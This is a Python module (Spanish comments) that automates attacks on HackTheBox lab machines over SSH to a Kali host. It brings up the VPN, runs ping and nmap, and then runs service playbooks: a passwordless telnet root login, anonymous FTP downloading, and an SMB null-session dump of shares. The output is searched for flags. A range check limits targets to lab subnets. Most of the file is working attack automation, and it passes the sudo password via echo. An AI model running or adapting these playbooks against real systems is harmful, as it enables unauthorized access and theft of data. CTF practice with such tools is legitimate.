"""
DEVOPS — Lab Hunter
Pentest automático de máquinas de laboratorio (HackTheBox) vía SSH a una Kali.
Pega una IP -> comprueba/levanta la VPN -> ping -> nmap -> playbook por servicio -> flag.

SOLO para rangos de laboratorio autorizados (HTB). Uso educativo en máquinas propias.
"""
import asyncio
import ipaddress
import re
import time

import paramiko

from config_manager import load_config

# Rangos permitidos: HTB (10.10.x VPN/labs, 10.129.x máquinas). Guardarraíl de scope.
LAB_RANGES = ["10.10.0.0/16", "10.129.0.0/16"]

FLAG_RE = re.compile(r"\b([a-f0-9]{32})\b")


def _now() -> str:
    return time.strftime("%H:%M:%S")


def _step(steps, fase, accion, resultado, salida="", hallazgos=None):
    """Añade un evento a la línea de tiempo (evidencia + aprendizaje)."""
    steps.append({
        "paso": len(steps) + 1,
        "ts": _now(),
        "fase": fase,
        "accion": accion,
        "resultado": resultado,
        "salida": salida.strip()[-4000:],
        "hallazgos": hallazgos or [],
    })


def in_scope(target: str) -> bool:
    try:
        ip = ipaddress.ip_address(target.strip())
    except ValueError:
        return False
    return any(ip in ipaddress.ip_network(r) for r in LAB_RANGES)


def _ssh():
    cfg = load_config().get("kali_ssh", {})
    if not cfg.get("host") or not cfg.get("user"):
        raise RuntimeError("Kali SSH sin configurar (config.json > kali_ssh).")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        cfg["host"], port=int(cfg.get("port", 22)), username=cfg["user"],
        password=cfg.get("password") or None,
        key_filename=cfg.get("key_path") or None,
        timeout=10, banner_timeout=15, auth_timeout=15,
        look_for_keys=False, allow_agent=False,   # imprescindible: si no, "No existing session"
    )
    return client


def _run(client, cmd, timeout=120) -> str:
    _, o, e = client.exec_command(cmd, timeout=timeout)
    return (o.read() + e.read()).decode(errors="replace")


def _sudo_pw() -> str:
    return load_config().get("kali_ssh", {}).get("password", "")


def ensure_vpn(client, steps) -> bool:
    """Comprueba tun0; si no está, levanta openvpn con el .ovpn del escritorio."""
    out = _run(client, "ip -br a | grep tun || echo NO_VPN")
    if "tun" in out and "NO_VPN" not in out:
        vip = re.search(r"(10\.10\.\d+\.\d+)", out)
        _step(steps, "VPN", "comprobar tun0", "conectada",
              out, [f"tun0={vip.group(1)}"] if vip else [])
        return True
    ovpn = _run(client, "find /home -iname '*.ovpn' 2>/dev/null | head -1").strip()
    if not ovpn:
        _step(steps, "VPN", "buscar .ovpn", "no encontrado",
              "Sube tu .ovpn de HTB al escritorio de la Kali.")
        return False
    _run(client, f"echo {_sudo_pw()} | sudo -S bash -c "
                 f"'pkill openvpn 2>/dev/null; nohup openvpn --config \"{ovpn}\" "
                 f"--daemon >/tmp/htbvpn.log 2>&1'")
    for _ in range(12):
        time.sleep(3)
        out = _run(client, "ip -br a | grep tun || echo NO")
        if "tun" in out and "NO" not in out:
            vip = re.search(r"(10\.10\.\d+\.\d+)", out)
            _step(steps, "VPN", "levantar openvpn", "conectada",
                  out, [f"tun0={vip.group(1)}"] if vip else [])
            return True
    _step(steps, "VPN", "levantar openvpn", "fallo: tun0 no subió")
    return False


# ----------------------------- PLAYBOOKS -----------------------------

def pb_telnet(client, target, steps) -> list:
    """Tier 0 estilo Meow: login root sin contraseña por telnet -> flag."""
    script = (
        "set timeout 30\n"
        f"spawn telnet {target}\n"
        'expect "login:"\n'
        'send "root\\r"\n'
        'expect "#"\n'
        'send "cat /root/flag.txt /root/root.txt /home/*/user.txt 2>/dev/null\\r"\n'
        'expect "#"\n'
        'send "id\\r"\n'
        'expect "#"\n'
        'send "exit\\r"\n'
        "expect eof"
    )
    out = _run(client, "expect -c '" + script + "'", timeout=60)
    flags = list(dict.fromkeys(FLAG_RE.findall(out)))
    hall = [f"flag={f}" for f in flags]
    if "uid=0" in out:
        hall.append("shell root")
    _step(steps, "EXPLOIT", "telnet login root (sin contraseña)",
          "acceso root + flag" if flags else "sin flag", out, hall)
    return flags


def pb_ftp(client, target, steps) -> list:
    """Tier 0 estilo Fawn: FTP anónimo -> lista y descarga archivos -> flag/creds."""
    user = "anonymous"
    listing = _run(client,
        f"curl -s --connect-timeout 10 ftp://{user}:{user}@{target}/", timeout=30)
    if not listing.strip():
        _step(steps, "ENUM", "FTP login anónimo", "sin acceso o directorio vacío", listing)
        return []
    files = [m.strip() for m in re.findall(r"(\S+)\s*$", listing, re.M)]
    _step(steps, "ENUM", "FTP login anónimo", "acceso OK", listing, [f"archivos={files}"])
    flags = []
    for fn in files:
        if not fn or fn in (".", ".."):
            continue
        content = _run(client,
            f"curl -s --connect-timeout 10 ftp://{user}:{user}@{target}/{fn}", timeout=30)
        found = FLAG_RE.findall(content)
        if found:
            flags += found
            hall = [f"flag en {fn}={found[0]}"]
        else:
            hall = [f"{fn}: {content.strip()[:200]}"] if content.strip() else []
        _step(steps, "LOOT", f"descargar {fn}", "flag!" if found else "leído", content, hall)
    return list(dict.fromkeys(flags))


def pb_smb(client, target, steps) -> list:
    """Estilo Dancing: SMB con sesión nula -> shares no-admin -> vuelca y caza flags."""
    # 1) Listar shares con sesión nula (-N) en formato parseable (-g): "Disk|nombre|comentario"
    listing = _run(client, f"smbclient -N -g -L //{target}/ 2>/dev/null", timeout=40)
    shares = [ln.split("|")[1].strip()
              for ln in listing.splitlines()
              if ln.strip().startswith("Disk|") and len(ln.split("|")) >= 2]
    DEFAULT = {"ADMIN$", "C$", "IPC$", "PRINT$", "NETLOGON", "SYSVOL"}
    custom = [s for s in shares if s and s.upper() not in DEFAULT]
    _step(steps, "ENUM", "SMB listar shares (sesión nula)",
          "acceso OK" if shares else "sin sesión nula", listing,
          [f"shares={shares}", f"no-admin={custom}"])
    if not custom:
        return []

    flags = []
    for sh in custom:
        tarf = "/tmp/lh_" + re.sub(r"[^A-Za-z0-9]", "_", sh) + ".tar"
        # Volcar TODO el share a un tar y leer su contenido recursivo de una sola vez.
        names = _run(client,
            f"rm -f {tarf}; smbclient -N //{target}/'{sh}' -Tc {tarf} '*' 2>/dev/null; "
            f"tar tf {tarf} 2>/dev/null", timeout=90)
        dump = _run(client, f"tar xOf {tarf} 2>/dev/null", timeout=60)
        found = FLAG_RE.findall(dump)
        accesible = bool(names.strip())
        hall = [f"flag={found[0]}"] if found else []
        if accesible:
            hall.insert(0, "ficheros=" + ", ".join(
                n.strip() for n in names.splitlines() if n.strip())[:300])
        _step(steps, "LOOT" if found else "ENUM",
              f"SMB volcar share '{sh}' (anónimo)",
              "flag!" if found else ("acceso OK" if accesible else "sin acceso"),
              names + "\n---\n" + dump, hall)
        flags += found
    return list(dict.fromkeys(flags))


# servicio detectado por nmap -> playbook a ejecutar
PLAYBOOKS = {
    "telnet": pb_telnet,
    "ftp": pb_ftp,
    "microsoft-ds": pb_smb,   # 445 (Dancing y cualquier caja Windows con SMB)
    "netbios-ssn": pb_smb,    # 139
}


def _hunt(target: str) -> dict:
    target = target.strip()
    res = {"target": target, "status": "", "services": [], "flags": [], "steps": []}
    steps = res["steps"]

    if not in_scope(target):
        res["status"] = "rechazado"
        _step(steps, "SCOPE", "validar IP",
              "FUERA DE RANGO de laboratorio — bloqueado",
              f"Permitidos: {', '.join(LAB_RANGES)}")
        return res

    try:
        client = _ssh()
    except Exception as ex:
        res["status"] = "error"
        _step(steps, "CONEXION", "SSH a Kali", f"error: {ex}")
        return res

    try:
        if not ensure_vpn(client, steps):
            res["status"] = "sin-vpn"
            return res

        ping = _run(client, f"ping -c 2 -W 3 {target}")
        if "0% packet loss" not in ping and "0% perdidos" not in ping:
            _step(steps, "CONECTIVIDAD", "ping objetivo",
                  "sin respuesta — ¿spawneaste la máquina en HTB?", ping)
            res["status"] = "inalcanzable"
            return res
        rtt = re.search(r"=\s*[\d.]+/([\d.]+)/", ping)
        _step(steps, "CONECTIVIDAD", "ping objetivo", "vivo", ping,
              [f"rtt={rtt.group(1)}ms"] if rtt else [])

        nm = _run(client, f"nmap -T4 -sV --open {target}", timeout=220)
        ports = [(int(p), s) for p, s in re.findall(r"^(\d+)/tcp\s+open\s+(\S+)", nm, re.M)]
        res["services"] = [{"port": p, "service": s} for p, s in ports]
        _step(steps, "RECON", "nmap -sV", f"{len(ports)} puerto(s) abierto(s)", nm,
              [f"{p}/{s}" for p, s in ports])

        ran = set()
        for p, svc in ports:
            key = svc.rstrip("?").lower()   # nmap a veces marca "microsoft-ds?"
            pb = PLAYBOOKS.get(key)
            if pb and pb not in ran:
                ran.add(pb)                  # 139 y 445 comparten playbook: una sola pasada
                res["flags"] += pb(client, target, steps)
            elif not pb:
                _step(steps, "PLAYBOOK", f"{p}/{svc}",
                      "sin playbook todavía — pendiente de enseñar")

        res["flags"] = list(dict.fromkeys(res["flags"]))
        res["status"] = "owned" if res["flags"] else "recon-only"
    finally:
        client.close()

    # Persistencia en el vault de conocimiento (best-effort: nunca rompe el ataque).
    try:
        from services import lab_vault
        ruta = lab_vault.save(res)
        if ruta:
            _step(steps, "VAULT", "guardar runbook + flags",
                  "guardado", ruta, [f"runbook={ruta}"])
    except Exception as ex:
        _step(steps, "VAULT", "guardar runbook", f"omitido: {ex}")

    return res


async def hunt(target: str) -> dict:
    """Versión async para FastAPI (corre el trabajo bloqueante en un hilo)."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, _hunt, target)


if __name__ == "__main__":
    import json
    import sys
    t = sys.argv[1] if len(sys.argv) > 1 else "10.129.66.69"
    print(json.dumps(_hunt(t), indent=2, ensure_ascii=False))
